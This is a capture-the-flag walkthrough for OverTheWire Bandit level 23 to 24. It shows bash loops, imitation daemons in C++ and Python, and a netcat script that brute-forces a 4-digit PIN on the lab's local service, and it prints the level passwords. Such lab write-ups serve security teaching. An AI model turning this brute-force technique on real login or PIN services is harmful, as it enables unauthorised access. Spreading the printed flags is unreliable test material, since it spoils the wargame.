# Bandit Level 23 → Level 24 Brute-forcing with bash scripting and netcat

## Previous Flag
<b>gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</b>

## Goal
Use previous password to log in SSH with user <b>bandit24</b> on port <b>2220</b>. A daemon is listening on <b>port 30002</b> and will give you password for bandit25 if given <b>bandit24 password and a secret numeric 4-digit pincode</b>. There is no way to retrieve the pincode except by going through <b>all of the 10000 combinations</b>, called brute-forcing. You do <b>not need to create new connections</b> each time

## What I learned
```
for var in {1..3}
> do
>    echo "Value is $var"
> done
Value is 1
Value is 2
Value is 3

bandit24@bandit:~$ for var in {1..3}; do echo "Value is $var"; done
Value is 1
Value is 2
Value is 3

# Note: used $() instead of { .. }
bandit24@bandit:~$ for var in $(seq 1 3); do echo "Value is $var"; done
Value is 1
Value is 2
Value is 3

# Note: if want 0 in front
bandit24@bandit:~$ for var in {01..03}; do echo "Value is $var"; done
Value is 01
Value is 02
Value is 03

# Note: this would open multiple connections (not recommended)
# Fix: put nc localhost 30002 after done
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" | nc localhost 30002
```

## Side Quest
```
// C++ program mimics daemon
#include <iostream>
#include <sstream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 30002
#define PASSWORD "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
#define SECRET_PIN "1234"
#define NEXT_PASSWORD "EeoULMCra2q0dSkYj561DX7s1CpBuOBt"

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);
    char buffer[1024] = {0};

    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == 0) {
        perror("socket failed");
        return 1;
    }

    // Bind to port 30002
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    bind(server_fd, (struct sockaddr *)&address, sizeof(address));

    // Start listening
    listen(server_fd, 3);
    std::cout << "[+] Listening on port " << PORT << "...\n";

    while (true) {
        new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
        if (new_socket < 0) {
            perror("accept");
            continue;
        }

        memset(buffer, 0, sizeof(buffer));
        read(new_socket, buffer, 1024);

        std::string input(buffer);
        std::istringstream iss(input);
        std::string recv_password, recv_pin;
        iss >> recv_password >> recv_pin;

        std::cout << "Received: " << recv_password << " " << recv_pin << "\n";

        if (recv_password == PASSWORD && recv_pin == SECRET_PIN) {
            std::string response = "Correct! The password for bandit25 is: " + std::string(NEXT_PASSWORD) + "\n";
            send(new_socket, response.c_str(), response.length(), 0);
        } else {
            std::string response = "Wrong! Please try again.\n";
            send(new_socket, response.c_str(), response.length(), 0);
        }

        close(new_socket);
    }

    return 0;
}

g++ -o daemon daemon.cpp
./daemon

#!/usr/bin/env python3
# Python program mimics daemon
import socket

HOST = '0.0.0.0'
PORT = 30002

CORRECT_PASSWORD = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
SECRET_PIN = "1234"
NEXT_PASSWORD = "EeoULMCra2q0dSkYj561DX7s1CpBuOBt"

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[+] Listening on port {PORT}...")

        while True:
            conn, addr = s.accept()
            with conn:
                print(f"[+] Connection from {addr}")

                data = conn.recv(1024).decode().strip()
                print(f"[>] Received: '{data}'")

                parts = data.split()
                if len(parts) == 2:
                    password, pin = parts
                    if password == CORRECT_PASSWORD and pin == SECRET_PIN:
                        response = f"Correct! The password for bandit25 is: {NEXT_PASSWORD}\n"
                    else:
                        response = "Wrong! Please try again.\n"
                else:
                    response = "Invalid format. Use: <password> <pin>\n"

                conn.sendall(response.encode())
                print("[<] Response sent\n")

if __name__ == "__main__":
    main()

chmod +x daemon_server.py
./daemon_server.py                                  # python3 daemon_server.py
```

## Solution
```
@trungdullc ➜ /workspaces/01noobHacker (main) $ ssh bandit24@bandit.labs.overthewire.org -p 2220 ⌨️
bandit24@bandit:~$ nc localhost 30002 ⌨️
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000 ⌨️
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001 ⌨️                         
Wrong! Please enter the correct current password and pincode. Try again.
^C ⌨️
bandit24@bandit:~$ mktemp -d ⌨️
/tmp/tmp.Z9RxVFIRw1
bandit24@bandit:~$ cd /tmp/tmp.Z9RxVFIRw1 ⌨️
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ vi brute_force_pin.sh ⌨️
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ cat brute_force_pin.sh ⌨️
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt ⌨️
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ chmod +x brute_force_pin.sh ⌨️
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ ls -la brute_force_pin.sh ⌨️
-rwxrwxr-x 1 bandit24 bandit24 163 Aug  2 02:25 brute_force_pin.sh
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ bash brute_force_pin.sh ⌨️
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ ls ⌨️
brute_force_pin.sh  possibilities.txt  result.txt
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ head -n 3 possibilities.txt ⌨️
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ tail result.txt ⌨️
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 🔐
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ nc localhost 30002 ⌨️
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0737 ⌨️
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 🔐
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ vi brute_force2.sh ⌨️
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ chmod +x brute_force2.sh ⌨️ 
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ cat brute_force2.sh ⌨️
#!/bin/bash

# outputs directly in terminal instead of a file
for i in {0000..9999}
do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done | nc localhost 30002
bandit24@bandit:/tmp/tmp.Z9RxVFIRw1$ ./brute_force2.sh ⌨️
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 🔐
```

## Flag
<b>iCi86ttT4KSNe1armKiwbQNmB3YJP3q4</b>

## Continue
[Continue](/overthewire/Bandit2425.md)